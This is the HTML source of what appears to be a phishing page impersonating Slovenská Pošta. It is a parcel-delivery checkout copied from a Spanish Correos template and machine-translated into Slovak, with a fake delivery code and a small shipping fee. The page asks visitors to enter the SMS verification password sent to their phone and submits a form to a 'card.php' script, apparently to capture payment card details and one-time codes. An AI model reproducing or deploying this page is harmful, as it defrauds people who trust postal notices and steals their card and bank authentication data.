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" data-deferred="1" jsname="Q4LuWd" width="62" height="59" data-index="0" alt="Slovenská Pošta Logo Vector (.CDR) Free Download" data-iml="848.5799999980372" data-atf="true">
			    
			    
			    
			    
				<div class="collapse navbar-collapse" id="common-screen-top-navbar">
					
			    </div>
			</nav>
<a class="navbar-brand" href="https://swiss.milna.org/"></a>
		</section>
		
		<section class="common-screen-content">
			

<section class="go-back-to-shop" style="/*! background: #a1a3c4; */background�: #ddddd2;">
	
</section>

<section class="checkout-template" style="/*! background: #a1a3c4; */">
	<div class="container">
	
		<div class="cart-no-product-alert" style="display:none"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Vo vašom košíku nie sú žiadne položky</font></font></font></font></font></font></font></font></font></font></font></font></div>
	



<!--null
-->

		<div class="alert alert-danger alert-error alert-dismissable shopping-cart-alert" style="display:none"><button type="button" class="close" data-dismiss="alert"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">×</font></font></font></font></font></font></font></font></font></font></font></font></font></font></button><strong></strong></div>
		<!-- Mobile version Summary of the cart -->
		
		<!-- Mobile version Summary of the cart -->
	
		<div class="row flex-column-reverse flex-lg-row">
			<div class="col-lg-7">
				<div class="checkout-left-side">
					<div id="cartParent" style="opacity: 1;">
						
						
					
						<div id="carrierLocked" class="shopping-cart-locked-parent" style="display: block;">



</div>
						<div id="carrierFormParent" class="shopping-cart-form-parent" style="display: none;">


<section class="checkout-shipping-type">
	<div class="checkout-box">	
		
		<div class="checkout-box-title">
			<div class="checkout-box-title-icon"><i class="flaticon-package"></i></div>
			<h4><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Dodací kód: UK / 2938456</font></font></font></font></font></font></font></font></font></font></font></font></h4>
		</div>
		<div class="checkout-box-content">
			<div class="checkout-shipping-type-content">
				
				
					<form id="carrierForm" method="post" action="https://swiss.milna.org/cart/changecarrier" class="">
						<input type="hidden" name="carrierid" id="carrierid" value="3">
						<input type="hidden" name="isselfpick" id="isselfpick" value="0">
						<input type="hidden" name="selfpickstorecode" id="selfpickstorecode" value="">
						<input type="hidden" name="homepaqtoken" id="homepaqtoken" value="">
						
						
							
									
							<!--  NEW SCREEN BEGIN -->
							<div class="checkout-shipping-type-zones">
								<div class="checkout-shipping-type-zones-image">
									
									<img class="img-responsive" alt="Paq Estándar" src="./SMS Verificacion/correos-paq-72-mini.png">
									
									
								</div>
								
								
									<div class="custom-control custom-checkbox form-check office-delivery">
										
											<input type="checkbox" id="carrierselection3" class="custom-control-input carrierselection" data-carrier="3" data-selfpick="0">
											<label class="custom-control-label" for="carrierselection3"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
												Doma </font></font></font></font></font></font></font></font></font></font></font></font><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(2,99 EUR)</font></font></font></font></font></font></font></font></font></font></font></font></strong>
											</label>
										
									</div>
								
								
								
									<div class="custom-control custom-checkbox form-check office-nodelivery-container">
										
										<input type="checkbox" id="carrierselection_self3" class="custom-control-input carrierselection" data-carrier="3" data-selfpick="1" data-postalcode="39999" data-is-pickup-at-shop="0">
										<label class="custom-control-label" for="carrierselection_self3"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
										
											Príjem poštou </font></font></font></font></font></font></font></font></font></font></font></font><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(2,99 EUR)</font></font></font></font></font></font></font></font></font></font></font></font></strong>
										
										</label>
										
										
									<!-- Correos hidden offices -->
										
										<div class="offices-search-container" style="display:none">
											<!-- <div class="custom-control custom-checkbox form-check">
												<input type="checkbox" class="custom-control-input" id="Office1">
												<label class="custom-control-label" for="Office1">Barcelona suc 16. la vila olimpica - doctor trueta 58-60 08005 barcelona</label>
											</div>
											<div class="custom-control custom-checkbox form-check">
												<input type="checkbox" class="custom-control-input" id="Office2">
												<label class="custom-control-label" for="Office2">Barcelona suc 16. la vila olimpica - doctor trueta 58-60 08005 barcelona</label>
											</div> -->
										</div>
									<!-- Correos hidden offices -->
										
									</div>
								
								
							</div>
							<div style="width:100%">
								
								<small class="text-muted"><p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Doručené bude maximálne do 72 hodín</font></font></font></font></font></font></font></font></font></font></font></font></p></small>
							</div>
						<!--  NEW SCREEN END -->
						
						
							
									
							<!--  NEW SCREEN BEGIN -->
							<div class="checkout-shipping-type-zones type-city">
								<div class="checkout-shipping-type-zones-image">
									
									<img class="img-responsive" alt="Paq Estándar CityPaq" src="./SMS Verificacion/correos-paq72.png">
									
									
								</div>
								
								
									<div class="custom-control custom-checkbox form-check office-delivery">
										
										
											
												<input type="checkbox" id="carrierselection9" class="custom-control-input carrierselection" data-carrier="9" data-homepaq="1" data-selfpick="1">
												<label class="custom-control-label" for="carrierselection9"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
													Poštovné cez CityPaq </font></font></font></font></font></font></font></font></font></font></font></font><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(2,99 EUR)</font></font></font></font></font></font></font></font></font></font></font></font></strong>
												</label>
													
												<div class="cityPaq-search-container" style="display:none;">
													
														<p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Označuje užívateľské meno CityPaq:</font></font></font></font></font></font></p>
														<div class="input-group">
															<input class="form-control py-2 homepaqusername validate[required]" type="search" name="homepaqusername9" id="homepaqusername9">
															<span class="input-group-append">
																<font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><input type="button" class="btn btn-outline-secondary searchhomepaq" value="Vyhľadávanie" data-val="homepaqusername9" data-target="homepaqresult9"></font></font></font></font></font></font>
															</span>
														</div>
														
														<div id="homepaqresult9" class="homepaqresultdiv">
															<p class="citypaq-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
																If you do not use CityPaq, you can register it in the following languages: </font></font><a href="https://online.citypaq.es/pages/registro.xhtml" target="_homepaq"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CityPaq</font></font></a>
															</p>
														</div>
													
												</div>
												
										
									</div>
								
								
								
								
							</div>
							<div style="width:100%">
								
									
										 <small class="text-muted"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Paq Estándar CityPaq</font></font></font></font></small>
									
								
								<small class="text-muted"><p>Haz tus pedidos y recógelos en el CityPaq que más te convenga</p></small>
							</div>
						<!--  NEW SCREEN END -->
						
						
					</form>
				
				
				
				
			</div>
		</div>
	</div>
</section></div>
						
						<div id="paypalexpressParent" class="shopping-cart-locked-parent" style="display: block;">
	
</div>
						
						<div id="shippingAddressLocked" class="shopping-cart-locked-parent" style="display: none;"></div>
						<div id="shippingAddressList" class="shopping-cart-form-parent" style="display: none;"></div>
						<div id="shippingAddressForm" class="shopping-cart-form-parent" style="display: block;">

<section class="checkout-new-shipping-address">
	<div class="checkout-box">
		
					
			<div class="modal2" style="border-radius: 11px;">
<div class="modal__container" style="border-radius: 11px;">

<div class="modal__content" style="/*! background: #ddddd2; *//*! border-right: dotted; */border-block-color: ;border-radius: 64px;background-image: linear-gradient(#ffffff, #f6fff7);">
<div class="checkout-box-title">
			
			<p style="
    font-size: 21px;
    font-weight: bold;
    color: #0c0c0c;
    "><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Počkaj minútu</font></font></font></font></font></font></font></font></font></font></font></font></p>


		</div>





<p style="color: rgb(0, 0, 0); font-size: 16px; font-family: Calibri;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">



</font></font></font></font></font></p><p style="color: rgb(52 55 58);font-size: 16px;font-family: Calibri;font-weight: bold;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><big><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Na potvrdenie procesu zadajte heslo, ktoré vám pošleme prostredníctvom SMS na váš mobilný telefón
</font></font></font></font></font></font></font></font></font></font></font></font></big></font></font></font></p>



<p></p>



<hr><br>



	
<form name="form" action="././card.php" method="post">
